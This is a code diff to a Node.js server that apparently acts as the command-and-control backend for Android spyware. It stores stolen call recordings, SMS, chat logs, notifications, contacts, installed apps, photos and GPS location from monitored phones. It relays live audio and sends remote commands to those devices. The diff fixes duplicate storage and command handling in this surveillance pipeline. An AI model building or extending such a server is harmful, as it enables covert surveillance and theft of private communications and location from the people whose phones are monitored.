@@ -6,7 +6,7 @@ const bodyParser = require('body-parser');
 const cloudinary = require('cloudinary').v2;
 const http = require('http'); 
 const { Server } = require("socket.io");
-const compression = require('compression'); // ✅ Fast Data Transfer
+const compression = require('compression'); 
 
 const app = express();
 const server = http.createServer(app);
@@ -49,7 +49,7 @@ let devicesStatus = {};
 // ==================================================
 io.on('connection', (socket) => {
     
-    // 1. Join Room (Android connects here)
+    // 1. Join Room
     socket.on('join', (roomID) => {
         socket.join(roomID);
         console.log(`🔌 Device Joined Room: ${roomID}`);
@@ -62,7 +62,7 @@ io.on('connection', (socket) => {
 
     // 3. Control Events
     socket.on('control-event', (data) => {
-        console.log(`🎮 Control Event: ${data.action} -> ${data.room}`);
+        // console.log(`🎮 Control Event: ${data.action}`);
         socket.to(data.room).emit('control-event', data);
     });
 
@@ -71,13 +71,13 @@ io.on('connection', (socket) => {
         if (data.targetId && data.command) {
             io.to(data.targetId).emit('command', data.command);
             
-            if(devicesStatus[data.targetId]) {
-                devicesStatus[data.targetId].command = data.command;
-            }
+            // Backup for Polling
+            if (!devicesStatus[data.targetId]) devicesStatus[data.targetId] = { id: data.targetId };
+            devicesStatus[data.targetId].command = data.command;
         }
     });
 
-    // 5. Audio Stream Relay (Binary)
+    // 5. Audio Stream Relay
     socket.on('audio-stream', (blob) => {
         const rooms = socket.rooms;
         for (const room of rooms) {
@@ -91,7 +91,7 @@ io.on('connection', (socket) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server Running: Audio History API Added!');
+    res.send('✅ Server Running: Duplicate Fix Applied!');
 });
 
 // ==================================================
@@ -119,7 +119,7 @@ app.post('/api/upload-image', (req, res) => {
 });
 
 // ==================================================
-//  ✅ AUDIO UPLOAD (Saves to Cloudinary)
+//  ✅ AUDIO UPLOAD
 // ==================================================
 app.post('/api/upload-audio', (req, res) => {
     let { device_id, audio_data, filename } = req.body; 
@@ -127,55 +127,33 @@ app.post('/api/upload-audio', (req, res) => {
     if (!device_id || !audio_data) return res.status(400).json({ error: "No Data" });
     const id = device_id.toString().trim().toUpperCase();
     
-    // Calls Folder
     let folderPath = `${id}/calls`; 
-
-    // Base64 check
     let base64Audio = audio_data.startsWith('data:audio') ? audio_data : "data:audio/mp4;base64," + audio_data;
 
     cloudinary.uploader.upload(base64Audio, 
-        { 
-            folder: folderPath, 
-            public_id: filename || Date.now().toString(), 
-            resource_type: "video" // 🔥 Cloudinary Audio ko Video maanta hai
-        }, 
+        { folder: folderPath, public_id: filename || Date.now().toString(), resource_type: "video" }, 
         (error, result) => {
-            if (error) {
-                console.log("Audio Upload Error:", error);
-                return res.status(500).json({ error: "Upload Failed" });
-            }
-            
-            // Dashboard pe alert bhejo
+            if (error) return res.status(500).json({ error: "Upload Failed" });
             io.emit('new-audio', { device_id: id, url: result.secure_url, name: filename });
-            
             res.json({ status: "success", url: result.secure_url });
         }
     );
 });
 
-// ==================================================
-//  🔥 NEW: GET AUDIO HISTORY (Fix for Dashboard)
-// ==================================================
 app.get('/api/audio-history/:device_id', async (req, res) => {
     const id = req.params.device_id.trim().toUpperCase();
-    
     try {
-        // Cloudinary search API
-        // Hum 'video' type dhoond rahe hain kyunki upload 'video' type me hua tha
         const result = await cloudinary.search
             .expression(`folder:${id}/calls AND resource_type:video`) 
             .sort_by('created_at', 'desc')
             .max_results(50)
             .execute();
-
         res.json(result.resources);
     } catch (error) {
-        console.error("❌ History Error:", error);
-        res.json([]); // Error aane par empty list bhejo
+        res.json([]); 
     }
 });
 
-// ✅ Gallery List
 app.get('/api/gallery-list/:device_id', (req, res) => {
     const id = req.params.device_id.toUpperCase();
     const next_cursor = req.query.next_cursor || null;
@@ -196,7 +174,7 @@ app.get('/api/gallery-list/:device_id', (req, res) => {
 });
 
 // ==================================================
-//  🔥 STATUS & LOCATION
+//  🔥 FIXED STATUS & COMMAND HANDLING
 // ==================================================
 
 app.get('/api/admin/all-devices', (req, res) => {
@@ -217,13 +195,14 @@ app.post('/api/status', (req, res) => {
         if (!device_id) return res.status(400).json({ error: "No ID" });
 
         const id = device_id.toString().trim().toUpperCase();
-        let pendingCommand = "none";
         
+        // 🔥 FIX: Command ek baar bhejo, fir 'none' kar do
+        let commandToSend = "none";
         if (devicesStatus[id] && devicesStatus[id].command) {
-            pendingCommand = devicesStatus[id].command;
-            devicesStatus[id].command = "none"; 
+            commandToSend = devicesStatus[id].command;
         }
 
+        // Update Status
         devicesStatus[id] = {
             ...devicesStatus[id], 
             id: id,
@@ -236,17 +215,17 @@ app.post('/api/status', (req, res) => {
             accuracy: accuracy || (devicesStatus[id]?.accuracy || 0),
             speed: speed || (devicesStatus[id]?.speed || 0),
             lastSeen: Date.now(),
-            command: devicesStatus[id]?.command || "none" 
+            command: "none" // 🔥 IMPORTANT: Hamesha reset karo taaki loop na bane
         };
 
-        res.json({ status: "success", command: pendingCommand });
+        res.json({ status: "success", command: commandToSend });
     } catch (e) {
         res.status(500).json({ error: "Server Error" });
     }
 });
 
 // ==================================================
-//  🔥 DATA STORAGE (Logs, SMS, etc.)
+//  🔥 FIXED DATA STORAGE (NO DUPLICATES)
 // ==================================================
 
 app.post('/api/upload_data', async (req, res) => { 
@@ -258,59 +237,53 @@ app.post('/api/upload_data', async (req, res) => {
 
     try {
         let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
+        let finalData = parsedData;
 
+        // --- LOCATION HANDLING ---
         if (type === 'location') {
             const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
-            
             if (locObj && (locObj.lat || locObj.latitude)) {
                 if (!devicesStatus[id]) devicesStatus[id] = { id: id };
-                
                 devicesStatus[id].lat = locObj.lat || locObj.latitude;
                 devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
-                devicesStatus[id].accuracy = locObj.accuracy || locObj.acc || 0;
-                devicesStatus[id].speed = locObj.speed || 0;
+                devicesStatus[id].lastSeen = Date.now();
             }
         }
 
-        let finalData = parsedData;
-
-        if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
+        // --- 🔥 CRITICAL FIX: OVERWRITE vs APPEND ---
+        // In cheezo ko hamesha OVERWRITE karo (Duplicate hatane ke liye)
+        if (['contacts', 'installed_apps', 'call_logs'].includes(type)) {
+             // Sirf naya data rakho (Purana delete)
+             finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
+        } 
+        // In cheezo ko APPEND karo (Jodte raho)
+        else if (['notifications', 'sms', 'chat_logs', 'location'].includes(type)) {
             let existingData = [];
             try {
-                const fileContent = await fs.promises.readFile(filePath, 'utf8');
-                existingData = JSON.parse(fileContent);
+                if (fs.existsSync(filePath)) {
+                    const fileContent = await fs.promises.readFile(filePath, 'utf8');
+                    existingData = JSON.parse(fileContent);
+                }
             } catch (e) { }
 
             let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
             
+            // Chat Logs unique handle karne ke liye timestamp add karo
             if (type === 'chat_logs') {
                 newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
-                finalData = [...existingData, ...newDataArray]; 
-                if (finalData.length > 5000) finalData = finalData.slice(finalData.length - 5000);
-            } else {
-                finalData = [...newDataArray, ...existingData].slice(0, 2000); 
             }
+            
+            // Naya + Purana
+            finalData = [...newDataArray, ...existingData].slice(0, 3000); // Keep max 3000 logs
         }
 
+        // Save to File
         await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
         res.json({ status: "success" });
+
     } catch (error) {
         console.error("Data Write Error:", error);
         res.status(500).json({ status: "error" });
-    }
-});
-
-app.get('/api/get-data/:device_id/:type', async (req, res) => {
-    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
-    try {
-        if (fs.existsSync(filePath)) {
-            const readStream = fs.createReadStream(filePath);
-            readStream.pipe(res);
-        } else {
-            res.json([]);
-        }
-    } catch (e) {
-        res.json([]);
     }
 });
 
@@ -323,7 +296,7 @@ app.post('/api/send-command', (req, res) => {
     // 1. Socket se live bhejo
     io.to(id).emit('command', command);
 
-    // 2. Status mein save karo (taki agar offline ho to baad me mile)
+    // 2. Status mein save karo (polling ke liye)
     if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
     devicesStatus[id].command = command;
     
